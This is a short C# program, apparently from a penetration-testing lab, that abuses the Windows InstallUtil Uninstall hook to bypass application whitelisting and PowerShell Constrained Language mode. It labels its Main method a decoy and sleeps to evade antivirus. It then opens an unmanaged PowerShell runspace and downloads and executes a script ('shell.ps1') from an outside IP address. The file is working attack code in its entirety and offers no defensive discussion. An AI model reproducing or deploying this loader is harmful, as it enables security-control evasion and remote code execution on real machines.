using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Threading;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // Sleep for a short duration to evade antivirus
            Thread.Sleep(5000); // Sleep for 5 seconds

            // Bypass PowerShell ConstrainedLanguage mode
            string cmdBypass = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            RunPowerShellCommand(cmdBypass);

            // Execute the PowerShell script from the URL after the bypass
            string cmdExecute = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.240/shell.ps1')";
            RunPowerShellCommand(cmdExecute);
        }

        private void RunPowerShellCommand(string command)
        {
            using (Runspace rs = RunspaceFactory.CreateRunspace())
            {
                rs.Open();
                using (PowerShell ps = PowerShell.Create())
                {
                    ps.Runspace = rs;
                    ps.AddScript(command);
                    ps.Invoke();
                }
                rs.Close();
            }
        }
    }
}
